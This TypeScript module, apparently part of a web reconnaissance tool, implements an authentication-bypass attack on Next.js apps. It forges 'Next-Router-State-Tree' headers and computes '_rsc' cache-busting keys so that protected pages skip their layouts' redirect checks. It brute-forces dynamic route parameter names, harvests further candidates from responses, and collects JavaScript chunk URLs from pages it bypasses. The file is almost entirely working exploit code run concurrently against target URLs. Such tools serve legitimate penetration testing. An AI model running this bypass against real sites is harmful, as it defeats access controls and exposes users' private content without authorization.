import { createHash } from "node:crypto";
import rawRequest from "../../exploit/utility/rawRequest.js";
import { runWithConcurrency } from "../../utility/concurrency.js";
import { printMsg, MSG } from "../../utility/printMsg.js";

/** Marker Next.js embeds in a Flight payload when a layout/page calls redirect(). */
const NEXT_REDIRECT_MARKER = "NEXT_REDIRECT";

export type LeafMode = "page" | "metadata-only";

/**
 * A forged ancestor segment. A plain string claims a static path segment (e.g.
 * `"dashboard"`) is mounted. `{ paramName, value }` claims a dynamic route segment (e.g.
 * `app/organizations/[org]/layout.js`) is mounted — Next.js's `matchSegment` requires an
 * exact `[paramName, value]` tuple for dynamic segments (a bare string never matches one),
 * and a black-box crawl can't know the app's real param name, only the URL's literal value.
 */
export type AncestorSegment = string | { paramName: string; value: string };

/** Converts one ancestor segment to its FlightRouterState wire representation. */
const toSegmentRepr = (segment: AncestorSegment): string | [string, string, "d"] =>
    typeof segment === "string" ? segment : [segment.paramName, segment.value, "d"];

/** The literal URL path value of an ancestor segment, regardless of representation. */
export const ancestorSegmentValue = (segment: AncestorSegment): string =>
    typeof segment === "string" ? segment : segment.value;

/**
 * Builds the `Next-Router-State-Tree` header value: a URL-encoded FlightRouterState
 * claiming every segment in `ancestorSegments` is already client-rendered, with the
 * leaf segment either an ordinary `__PAGE__` node or (leafMode="metadata-only") a node
 * flagged so Next.js only re-executes `generateMetadata()` for it. Mirrors the
 * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`.
 */
export const buildStateTreeHeader = (ancestorSegments: AncestorSegment[], leafMode: LeafMode = "page"): string => {
    let node: unknown = leafMode === "metadata-only" ? ["__PAGE__", {}, null, "metadata-only"] : ["__PAGE__", {}];
    for (let i = ancestorSegments.length - 1; i >= 0; i--) {
        node = [toSegmentRepr(ancestorSegments[i]), { children: node }];
    }
    const tree = ["", { children: node }];
    return encodeURIComponent(JSON.stringify(tree));
};

/**
 * Strong `_rsc` cache-busting key: SHA-256 of the four cache-busting inputs, truncated to
 * 96 bits and base64url-encoded. Mirrors `computeCacheBustingSearchParam` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` — not a secret, any client can
 * compute it from headers it itself sends.
 */
export const computeStrongRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    const digest = createHash("sha256").update(input).digest();
    return digest.subarray(0, 12).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
};

/**
 * 32-bit djb2xor hash, as used by Next.js's legacy (non-cryptographic) cache-busting key.
 * Mirrors `djb2Hash` in `shared/lib/hash.ts`.
 */
const djb2Hash = (str: string): number => {
    let hash = 5381;
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) + hash + str.charCodeAt(i)) & 0xffffffff;
    }
    return hash >>> 0;
};

/**
 * Legacy `_rsc` cache-busting key: `djb2Hash` of the same four inputs as
 * `computeStrongRscKey`, base36-encoded and truncated to 5 characters. Mirrors
 * `computeLegacyCacheBustingSearchParam`/`hexHash` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` / `shared/lib/hash.ts`. Cheaper
 * to compute than the strong key, and some Next.js builds accept it as a fallback when the
 * strong-key check fails (see `NEXT-RSC-002`) — no crypto required to probe with it first.
 */
export const computeLegacyRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    return djb2Hash(input).toString(36).slice(0, 5);
};

/**
 * Common dynamic route param names to guess when the last ancestor segment might be a
 * dynamic route (e.g. `[org]`, `[id]`) rather than a static one. Bounded to keep the
 * per-candidate request count small; a miss just falls through to the next guess. Worst
 * case per candidate URL: `(2 static attempts + this list's length)` guesses, each up to 2
 * key modes (legacy/strong) and up to 2 leaf modes (page/metadata-only) — i.e. roughly
 * `(2 + 20) * 2 * 2 = 88` requests before any RSC-body harvesting fallback (see
 * `extractParamNameCandidatesFromFlightBody`) kicks in, which only spends further requests
 * when this list's guesses all fail AND harvesting actually turns up a new name, capped by
 * `--rsc-param-bruteforce-limit`.
 */
const COMMON_DYNAMIC_PARAM_NAMES = [
    "id",
    "slug",
    "org",
    "orgId",
    "organization",
    "tenant",
    "tenantId",
    "username",
    "userId",
    "user",
    "account",
    "accountId",
    "workspace",
    "workspaceId",
    "project",
    "projectId",
    "team",
    "teamId",
    "handle",
    "name",
    "key",
] as const;

/**
 * Ancestor-segment claims worth trying per candidate path: first segment only, every
 * segment but the leaf (both as plain static segments), and — for the latter, since a
 * static-segment guess can never match a real dynamic route — the same set with its last
 * segment additionally tried as each of `paramNameCandidates`. Defaults to
 * `COMMON_DYNAMIC_PARAM_NAMES`; `next_routerStateForge` also calls this with RSC-body-
 * harvested names as a fallback when the default list's guesses all fail.
 */
export const buildAncestorAttempts = (
    pathSegments: string[],
    paramNameCandidates: readonly string[] = COMMON_DYNAMIC_PARAM_NAMES
): AncestorSegment[][] => {
    if (pathSegments.length === 0) return [];
    const attempts: AncestorSegment[][] = [[pathSegments[0]]];
    const allButLeaf = pathSegments.slice(0, -1);
    if (allButLeaf.length > 0 && allButLeaf.join("/") !== pathSegments[0]) {
        attempts.push(allButLeaf);

        const withoutLastAncestor = allButLeaf.slice(0, -1);
        const lastAncestorValue = allButLeaf[allButLeaf.length - 1];
        for (const paramName of paramNameCandidates) {
            attempts.push([...withoutLastAncestor, { paramName, value: lastAncestorValue }]);
        }
    }
    return attempts;
};

/** True when a Flight/RSC payload records a server-side redirect (the auth check actually ran). */
export const containsNextRedirectMarker = (body: string): boolean => body.includes(NEXT_REDIRECT_MARKER);

/**
 * Extracts `static/chunks/*.js` (including Turbopack `~`-separated names) references from a
 * Flight payload body. Real payloads encode these WITHOUT a `_next/` prefix — e.g.
 * `4:I[3330,["614","static/chunks/app/dashboard/secret/page-<hash>.js"],"default"]` — the
 * client resolves them against its own asset prefix at runtime. An optional literal
 * `_next/` prefix is still matched for payload shapes that do include it.
 */
export const extractChunkPathsFromFlightBody = (body: string): string[] => {
    const matches = body.matchAll(/(?:_next\/)?static\/chunks\/[a-zA-Z0-9._\-/~]+\.js/g);
    return [...new Set([...matches].map((m) => m[0]))];
};

/** Object-key-shaped identifiers that show up next to arbitrary string values in a Flight
 * payload without being the real dynamic-route param name — prop/DOM-attribute-like keys
 * that would otherwise slip past the value-anchored pattern below. `id` is included
 * deliberately: it's already in `COMMON_DYNAMIC_PARAM_NAMES`, so a harvested `"id":"<value>"`
 * hit would only ever duplicate an attempt already made. */
const PARAM_NAME_CANDIDATE_NOISE = new Set([
    "children",
    "className",
    "key",
    "ref",
    "type",
    "props",
    "default",
    "name",
    "title",
    "description",
    "href",
    "src",
    "id",
    "digest",
]);

/**
 * Extracts candidate dynamic-route param names from a Flight/RSC response body already
 * fetched during a failed forge attempt. Two anchored patterns, deliberately narrow to keep
 * the false-positive rate — and therefore the number of extra requests this feeds back into
 * `buildAncestorAttempts` — low:
 *
 * 1. **Value-anchored key extraction.** Flight serializes plain-object props passed to
 *    Client Component boundaries as ordinary `"key":"value"` pairs, even though the payload
 *    as a whole isn't valid JSON/JS. The crawl already knows the ancestor's literal *value*
 *    (`knownValue`, e.g. `"acme-corp"`) but not its *key* — so a key quoted immediately next
 *    to that known value is a strong signal for the real `[paramName]`.
 * 2. **Bracket-source pattern (dev-mode only).** Next.js dev error/stack payloads embed
 *    webpack module source paths verbatim, e.g.
 *    `webpack-internal:///(rsc)/./app/organizations/[org]/layout.tsx` — the bracketed
 *    segment there IS the real param name, no anchoring needed since `[name]` in a module
 *    path is unambiguous by construction.
 */
export const extractParamNameCandidatesFromFlightBody = (body: string, knownValue: string): string[] => {
    if (!knownValue) return [];
    const escapedValue = knownValue.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const candidates = new Set<string>();

    const anchored = body.matchAll(new RegExp(`"([A-Za-z_$][A-Za-z0-9_$]{0,40})"\\s*:\\s*"${escapedValue}"`, "g"));
    for (const m of anchored) candidates.add(m[1]);

    const bracketed = body.matchAll(/\/\[([A-Za-z_$][A-Za-z0-9_$]{0,40})\]/g);
    for (const m of bracketed) candidates.add(m[1]);

    return [...candidates].filter((c) => !PARAM_NAME_CANDIDATE_NOISE.has(c) && c.length <= 24);
};

/** Resolves an extracted chunk path (with or without a `_next/` prefix) to an absolute URL. */
const resolveChunkUrl = (chunkPath: string, origin: string): string => {
    const normalized = chunkPath.startsWith("_next/") ? chunkPath : `_next/${chunkPath}`;
    return new URL(`/${normalized}`, origin).toString();
};

export interface RouterStateForgeResult {
    /** Page URLs where a forged full-content ancestor claim returned content without a NEXT_REDIRECT marker. */
    bypassedUrls: string[];
    /** Page URLs where only a metadata-only leaf claim succeeded (dynamic generateMetadata() output, not the full page body) — a distinct, narrower disclosure than `bypassedUrls`. */
    metadataOnlyBypassedUrls: string[];
    /** Bypassed URLs (from either mode above) where the cheap legacy _rsc key alone was accepted — a version/build-line fingerprint signal, since only builds with the legacy-key fallback path accept it. */
    legacyKeyAcceptedUrls: string[];
    /** New downloadable JS chunk URLs recovered from any bypassed Flight payload. */
    newJsUrls: string[];
}

const REQUEST_TIMEOUT_MS = 15000;

type RscKeyMode = "legacy" | "strong";

interface ForgeAttemptResult {
    success: boolean;
    body: string;
}

/** Renders an ancestor-segment list back to its literal URL path, for the `Next-Url` header. */
const ancestorsToPath = (ancestors: AncestorSegment[]): string => ancestors.map(ancestorSegmentValue).join("/");

/** Sends one forged-ancestor RSC request and reports whether it looks like a successful bypass. */
const attemptForge = async (
    candidateUrl: string,
    ancestors: AncestorSegment[],
    leafMode: LeafMode,
    keyMode: RscKeyMode,
    timeout: number
): Promise<ForgeAttemptResult> => {
    const stateTree = buildStateTreeHeader(ancestors, leafMode);
    const nextUrl = "/" + ancestorsToPath(ancestors);
    const rscKey =
        keyMode === "legacy" ? computeLegacyRscKey(stateTree, nextUrl) : computeStrongRscKey(stateTree, nextUrl);

    const forgedUrl = new URL(candidateUrl);
    forgedUrl.searchParams.set("_rsc", rscKey);

    const forged = await rawRequest(forgedUrl.toString(), {
        timeout,
        headers: {
            RSC: "1",
            "Next-Router-State-Tree": stateTree,
            "Next-Url": nextUrl,
        },
    });
    if (!forged) return { success: false, body: "" };

    const contentType = forged.headers["content-type"] ?? "";
    const success =
        forged.status === 200 && contentType.includes("text/x-component") && !containsNextRedirectMarker(forged.body);
    return { success, body: forged.body };
};

/**
 * Tries the cheap legacy key first (no SHA-256 needed); only computes and retries with the
 * strong key if the legacy attempt didn't succeed. Reports which key mode actually worked.
 */
const attemptForgeWithKeyFallback = async (
    candidateUrl: string,
    ancestors: AncestorSegment[],
    leafMode: LeafMode,
    timeout: number
): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
    const legacy = await attemptForge(candidateUrl, ancestors, leafMode, "legacy", timeout);
    if (legacy.success) return { ...legacy, keyMode: "legacy" };

    const strong = await attemptForge(candidateUrl, ancestors, leafMode, "strong", timeout);
    return { ...strong, keyMode: "strong" };
};

const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;

/**
 * For each candidate page URL that redirects an unauthenticated request, retries as an
 * RSC fetch with a forged `Next-Router-State-Tree` claiming known ancestor segments are
 * already mounted. If Next.js skips re-executing that ancestor's layout component (see
 * js-recon-internal-docs#142), the response comes back 200 without a NEXT_REDIRECT
 * record — content a plain crawl would never see.
 *
 * Two leaf modes are tried per candidate: an ordinary `page` claim (full body disclosure)
 * first, and — only if every `page` attempt fails — a `metadata-only` claim, which can
 * still leak dynamic `generateMetadata()` output even where a full-body claim doesn't
 * cleanly apply (e.g. a tenant-scoped layout).
 *
 * If every `COMMON_DYNAMIC_PARAM_NAMES` guess fails for both leaf modes, a bounded fallback
 * kicks in (internal#158): every response body already returned by those failed attempts
 * (no extra requests — it's information already paid for) is scanned via
 * `extractParamNameCandidatesFromFlightBody` for the app's real param name. If that turns up
 * any name not already in the fixed list, one bonus round of dynamic-guess attempts is tried
 * with those harvested names (capped at `rscParamBruteforceLimit`; `0` disables this
 * fallback entirely) — for each leaf mode, only if that leaf mode's fixed-list pass failed.
 */
const next_routerStateForge = async (
    candidateUrls: string[],
    threads: number,
    timeout: number = REQUEST_TIMEOUT_MS,
    rscParamBruteforceLimit: number = DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT
): Promise<RouterStateForgeResult> => {
    const bypassedUrls: string[] = [];
    const metadataOnlyBypassedUrls: string[] = [];
    const legacyKeyAcceptedUrls: string[] = [];
    const newJsUrls: string[] = [];

    await runWithConcurrency(candidateUrls, threads, async (candidateUrl) => {
        let parsed: URL;
        try {
            parsed = new URL(candidateUrl);
        } catch {
            return;
        }
        const segments = parsed.pathname.split("/").filter(Boolean);
        if (segments.length === 0) return;

        // Only worth forging against routes that actually redirect an unauthenticated request.
        const baseline = await rawRequest(candidateUrl, { timeout });
        if (!baseline || baseline.status < 300 || baseline.status >= 400) return;

        const recordChunks = (body: string) => {
            for (const chunkPath of extractChunkPathsFromFlightBody(body)) {
                newJsUrls.push(resolveChunkUrl(chunkPath, parsed.origin));
            }
        };

        // The literal value of the ancestor segment that a dynamic-route guess would target
        // (same one `buildAncestorAttempts` re-tries as each candidate param name), used to
        // anchor RSC-body harvesting. `undefined` when there's no such candidate slot at all
        // (matches `buildAncestorAttempts`'s own guard).
        const allButLeaf = segments.slice(0, -1);
        const lastAncestorValue =
            allButLeaf.length > 0 && allButLeaf.join("/") !== segments[0]
                ? allButLeaf[allButLeaf.length - 1]
                : undefined;
        const harvestedNames = new Set<string>();

        const ancestorAttempts = buildAncestorAttempts(segments);

        /** Tries every attempt in `attempts` under `leafMode`, harvesting param-name
         * candidates from each body along the way; returns true and records the hit on the
         * first success. */
        const tryAttempts = async (attempts: AncestorSegment[][], leafMode: LeafMode): Promise<boolean> => {
            for (const ancestors of attempts) {
                const result = await attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout);
                if (lastAncestorValue && result.body) {
                    for (const name of extractParamNameCandidatesFromFlightBody(result.body, lastAncestorValue)) {
                        harvestedNames.add(name);
                    }
                }
                if (result.success) {
                    const verb = leafMode === "page" ? "revealed content" : "revealed metadata";
                    const prefix = leafMode === "page" ? "Forged next-router-state-tree bypass" : "Forged metadata-only next-router-state-tree bypass";
                    printMsg(
                        MSG.Run,
                        `[✓] ${prefix} ${verb}: ${candidateUrl} (claimed ancestor: /${ancestorsToPath(ancestors)}, ${result.keyMode} _rsc key)`
                    );
                    (leafMode === "page" ? bypassedUrls : metadataOnlyBypassedUrls).push(candidateUrl);
                    if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
                    recordChunks(result.body);
                    return true;
                }
            }
            return false;
        };

        /** Bonus round of dynamic-guess-only attempts built from names harvested so far but
         * not already covered by the fixed wordlist; `[]` (no-op) if nothing new was found
         * or the fallback is disabled. */
        const harvestBonusAttempts = (): AncestorSegment[][] => {
            if (rscParamBruteforceLimit <= 0) return [];
            const newNames = [...harvestedNames].filter((n) => !COMMON_DYNAMIC_PARAM_NAMES.includes(n as never));
            if (newNames.length === 0) return [];
            return buildAncestorAttempts(segments, newNames.slice(0, rscParamBruteforceLimit)).slice(2);
        };

        let bypassed = await tryAttempts(ancestorAttempts, "page");
        if (!bypassed) bypassed = await tryAttempts(harvestBonusAttempts(), "page");
        if (bypassed) return;

        let metadataBypassed = await tryAttempts(ancestorAttempts, "metadata-only");
        if (!metadataBypassed) await tryAttempts(harvestBonusAttempts(), "metadata-only");
    });

    return {
        bypassedUrls: [...new Set(bypassedUrls)],
        metadataOnlyBypassedUrls: [...new Set(metadataOnlyBypassedUrls)],
        legacyKeyAcceptedUrls: [...new Set(legacyKeyAcceptedUrls)],
        newJsUrls: [...new Set(newJsUrls)],
    };
};

export default next_routerStateForge;
